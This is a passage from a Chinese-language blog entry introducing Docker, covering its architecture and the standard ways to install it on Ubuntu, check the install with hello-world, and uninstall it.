src="/../images/Docker/image-20230726232923656.png"></p><p>​Docker（内核+镜像） </p><blockquote><ul><li>容器化技术（&#x3D;&#x3D;不是完整的操作系统&#x3D;&#x3D;）</li><li>容器内的应用直接运行在宿主机的内容，容器没有自己的内核，也没有虚拟硬件，所以轻便</li></ul></blockquote><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>更快速的交付和部署</p><p>更便捷的升级和扩缩容（镜像一键运行）</p><p>更简单的系统运维</p><p>更高效的资源利用（内核级别的虚拟化）</p><h2 id="基本组成"><a href="#基本组成" class="headerlink" title="基本组成"></a>基本组成</h2><p><img src="/../images/Docker/image-20230728124422847.png" alt="image-20230728124422847"></p><p><strong>Client（客户端）</strong></p><blockquote><p>docker build创建</p><p>docker pull选取</p><p>docker run运行</p></blockquote><p><strong>DOCKER_HOST(服务器）</strong></p><blockquote><p>Images（镜像）&#x3D;&#x3D;类似于C++中的类&#x3D;&#x3D;（用于创建容器服务）</p><p>Containers（容器）&#x3D;&#x3D;类似于C++中类创建的对象&#x3D;&#x3D;（负责运行具体项目）</p></blockquote><p>**Registry（仓库） **</p><p>存放镜像的地方</p><p>分公有和私有</p><h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><p>Docker 并非是一个通用的容器工具，它依赖于已存在并运行的 Linux 内核环境。</p><p>Docker 实质上是在已经运行的 Linux 下制造了一个隔离的文件环境，因此，Docker 必须部署在 Linux 内核的系统上。如果其他系统想部署 Docker 就必须安装一个虚拟 Linux 环境。</p><p>鉴于CentOS在2024年将不再进行更新维护，我选择在Ubuntu上安装Docker</p><h2 id="Ubuntu安装"><a href="#Ubuntu安装" class="headerlink" title="Ubuntu安装"></a>Ubuntu安装</h2><h3 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h3><p>旧版本的 Docker 的名称为 、 或 。在尝试安装之前卸载任何此类旧版本 新版本：dockerdocker.iodocker-engine :::tips sudo apt-get remove docker docker-engine docker.io containerd runc ::: 如果报告未安装这些包，则没关系。apt-get 存储在<code>/var/lib/docker/</code>中的镜像、容器、卷和网络不是 卸载 Docker 时自动删除。</p><h3 id="使用存储库安装"><a href="#使用存储库安装" class="headerlink" title="使用存储库安装"></a>使用存储库安装</h3><p>在新主机上首次安装 Docker 引擎之前，您需要 需要设置 Docker 存储库。之后，您可以安装和更新 存储库中的 Docker。</p><h4 id="设置存储库"><a href="#设置存储库" class="headerlink" title="设置存储库"></a>设置存储库</h4><ol><li>更新软件包索引并安装软件包以允许使用 基于 HTTPS 的存储库：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install \<br>    ca<span class="hljs-operator">-</span>certificates \<br>    curl \<br>    gnupg \<br>    lsb<span class="hljs-operator">-</span><span class="hljs-keyword">release</span><br></code></pre></td></tr></table></figure><ol><li>添加 Docker 的官方 GPG 密钥：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/apt/keyrings<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg<br></code></pre></td></tr></table></figure><ol><li>使用以下命令设置存储库：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> \<br>  <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="hljs-string">  <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null<br></code></pre></td></tr></table></figure><h4 id="安装-Docker-engine"><a href="#安装-Docker-engine" class="headerlink" title="安装 Docker engine"></a>安装 Docker engine</h4><p>要安装最新版本，请运行：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin<br></code></pre></td></tr></table></figure><p>通过运行映像验证 Docker 引擎安装是否成功</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>现在你已经成功安装并启动了Docker engine。用户组存在，但是它不包含任何用户，这就是需要你用<code>sudo</code>运行docker命令的原因。你可以执行在CentOS安装Docker engine的后续步骤来允许非root用户运行docker命令。</p><h3 id="从包安装"><a href="#从包安装" class="headerlink" title="从包安装"></a>从包安装</h3><p>如果你不能使用 Docker 的仓库来安装 Docker Engine，你可以 下载适用于您的版本的文件并手动安装。你需要 每次要升级 Docker 引擎时下载一个新文件。</p><ol><li>转到<a href="https://link.juejin.cn/?target=https://download.docker.com/linux/ubuntu/dists/">download.docker.com&#x2F;linux&#x2F;ubunt…</a>.</li><li>在列表中选择你的 Ubuntu 版本。</li><li>转到并选择适用的体系结构。</li><li>下载以下适用于 Docker 引擎、CLI、containerd 和 和 Docker Compose 包：deb<ul><li>containerd.io  .deb</li><li>docker-ce  .deb</li><li>docker-ce-cli  .deb</li><li>docker-compose-plugin  .deb</li></ul></li><li>安装软件包。将以下示例中的路径更新为 你下载了 Docker 软件包的位置。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dpkg -i ./containerd.io_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb \<br>  ./docker-ce_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb \<br>  ./docker-ce-cli_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb \<br>  ./docker-compose-plugin_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb<br></code></pre></td></tr></table></figure><p>Docker 守护程序会自动启动。</p><ol><li>通过运行映像验证 Docker 引擎安装是否成功：</li></ol><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>现在你已经成功安装并启动了Docker engine。用户组存在，但是它不包含任何用户，这就是需要你用<code>sudo</code>运行docker命令的原因。你可以执行在CentOS安装Docker engine的后续步骤来允许非root用户运行docker命令。</p><h3 id="自动化脚本安装"><a href="#自动化脚本安装" class="headerlink" title="自动化脚本安装"></a>自动化脚本安装</h3><p>自动化脚本可以自动检测Linux发行版，因此在受支持的Linux发行版中运行自动化脚本的步骤是一致的，如果你想使用自动化脚本来安装Docker engine，请参阅在CentOS中安装Docker engine的使用自动化脚本安装一节。</p><h3 id="二进制文件安装"><a href="#二进制文件安装" class="headerlink" title="二进制文件安装"></a>二进制文件安装</h3><p>不建议在生产环境中使用二进制文件安装Docker engine，如果你的容器技术专家建议你这么做，那么请换一个专家。 二进制文件安装主要是为了不受支持的平台和测试环境中使用。我将简短的介绍在Linux上安装守护程序和客户端二进制文件。</p><h4 id="安装静态二进制文件"><a href="#安装静态二进制文件" class="headerlink" title="安装静态二进制文件"></a>安装静态二进制文件</h4><p>1.下载静态二进制压缩包，转到<a href="https://link.juejin.cn/?target=https://download.docker.com/linux/static/stable/">download.docker.com&#x2F;linux&#x2F;stati…</a>，选择适合你的压缩包。 2.提取压缩包中的二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xf /path/to/&lt;FILE&gt;.tar.gz<br></code></pre></td></tr></table></figure><p>3.这一步可选，将二进制文件移动到可执行文件路径下，如果没有这一步，则必须提供调用可执行文件的路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> docker/* /usr/bin/<br></code></pre></td></tr></table></figure><p>4.启动 Docker 守护进程：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo dockerd &amp;<br></code></pre></td></tr></table></figure><p>如果尼西亚使用其他选项启动守护进程，请修改上述内容命令或创建并编辑文件<code>/etc/docker/daemon.json</code>以添加自定义配置选项。</p><h3 id="验证是否安装成功"><a href="#验证是否安装成功" class="headerlink" title="验证是否安装成功"></a>验证是否安装成功</h3><p> 5.通过运行镜像来验证 Docker 是否已正确安装。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>此命令下载测试映像并在容器中运行它。当 容器运行，它会打印一条消息并退出。</p><p><img src="/../../images/Docker/image-20230802220618685.png" alt="image-20230802220618685"></p><p>第一次打开Docker的“hello-world”文件会先显示以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Unable to find image <span class="hljs-string">&#x27;hello-world:latest&#x27;</span> locally（本地无此文件）<br>Pulling repository hello-world（从Docker官方库中拉取相关信息）<br>91c95931e552: Download complete<br>a8219747be10: Download complete<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> hello-world:latest（下载完成）<br></code></pre></td></tr></table></figure><p>这意味着你的Docker安装成功了</p><p>我们可以查看刚刚下载的hello-world镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker images<br></code></pre></td></tr></table></figure><p><img src="/../../images/Docker/image-20230802223312044.png" alt="image-20230802223312044"></p><p>也可以查看当前docker版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -v<br></code></pre></td></tr></table></figure><p><img src="/../../images/Docker/image-20230802224541726.png" alt="image-20230802224541726"></p><h1 id="Docker卸载"><a href="#Docker卸载" class="headerlink" title="Docker卸载"></a>Docker卸载</h1><p>删除安装包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get purge docker-ce<br></code></pre></td></tr></table></figure><p>删除镜像、容器、配置文件等内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rm -rf /var/lib/docker<br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker默认工作路径！</span><br></code></pre></td></tr></table></figure><h1 id="阿里云镜像加速"><a href="#阿里云镜像加速" class="headerlink" title="阿里云镜像加速"></a>阿里云镜像加速</h1>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
